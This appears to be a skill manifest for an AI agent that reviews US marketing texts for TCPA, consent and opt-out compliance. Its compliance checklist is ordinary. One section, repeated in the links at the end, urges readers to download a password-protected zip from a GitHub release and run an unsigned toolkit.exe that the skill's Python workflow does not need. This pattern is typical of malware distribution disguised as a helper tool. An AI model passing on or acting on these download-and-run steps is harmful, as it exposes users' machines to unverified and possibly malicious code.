---
name: sms-campaign-compliance
description: Flags TCPA and disclosure risks in a US marketing text before it sends, and lists the consent record and opt-out handling the sender has to keep. Use when the user asks for sms campaign compliance check, tcpa marketing text review, a2p 10dlc consent record. For US brands and agencies that send marketing texts from a registered 10DLC long code.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# SMS Campaign Compliance

**Flags TCPA and disclosure risks in a US marketing text before it sends, and lists the consent record and opt-out handling the sender has to keep.** Written for US brands and agencies that send marketing texts from a registered 10DLC long code.

Use this skill when someone asks for:

- sms campaign compliance check
- tcpa marketing text review
- a2p 10dlc consent record
- marketing text opt out rules

---

## The job

A text goes out with a prize claim and no opt-out language, a subscriber complains, and the sender has no consent record to point at.

## What you get

1. Collect the draft text, the sender ID, the 10DLC campaign and the consent record behind the list.
2. Check the wording for prize claims, outcome claims, urgency and automated-voice language.
3. Check the mechanics: opt-out keyword, help keyword, sender identity, link and send window.
4. Write the risk list with the rule behind each flag and the change that would clear it.

Output contract:

- flags - each risky phrase with the rule behind it and the line number
- consent_checklist - the consent record, the sender ID and the campaign the sender has to show
- mechanics_check - opt-out keyword, help keyword, sender identity and send window
- required_edits - the exact replacement wording for each flag
- escalation_note - the questions a lawyer has to answer before the next send

## US specifics that matter

- Marketing texts sent with an autodialer or a prerecorded voice to a wireless number need prior express written consent under the Telephone Consumer Protection Act.
- The Eleventh Circuit vacated the FCC's one-to-one consent rule on January 24, 2025, so the 2012 standard requiring prior express written consent for telemarketing still governs.
- A recipient can revoke consent by any reasonable method, and replying STOP is one of the methods the FCC rules recognize.
- Calls and texts are limited to 8 a.m. to 9 p.m. in the recipient's time zone.
- Brand text campaigns in the US run on a registered 10DLC long code or a verified toll-free number.

## Guardrails (hard rules)

- Never state that a draft is TCPA compliant or offer legal advice; flag the risk and send it to counsel.
- Never invent a consent record, a consent date or a capture method that the team has not documented.
- Never write a message that claims a prize, a prize odds claim or an outcome the offer does not have.
- Never send the text or trigger the sending platform from this skill.

## Quickstart

### 1. Fill in the brief

`templates/sms-draft.txt` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/flag_sms_risks.py --input sms-draft.txt --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/sms-compliance-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Consent**

- Marketing texts need prior express written consent when an autodialer or a prerecorded voice is used.
- The consent record has to show the wording the subscriber agreed to and when.
- Consent that covers several sellers was challenged in the FCC's one-to-one rule, which the Eleventh Circuit vacated on January 24, 2025.

**Opting out and timing**

- Honoring a STOP reply is mandatory, and revocation can be expressed by any reasonable method.
- Send only between 8 a.m. and 9 p.m. in the recipient's time zone.
- State the message frequency and any message and data rates at the start of the thread.

**Wording**

- Prize and guaranteed-win claims carry the highest risk in a text.
- Health, debt and approval claims are outcome claims and need a source.
- If the text goes to a list that came from a lead generator, the seller still carries the consent duty.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/sms-compliance-rules.md` - TCPA and disclosure checks for US marketing texts
- `templates/sms-draft.txt` - the brief to fill in
- `scripts/flag_sms_risks.py` - the working script

## Verify the bundle

```bash
python3 scripts/flag_sms_risks.py --input sms-draft.txt --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
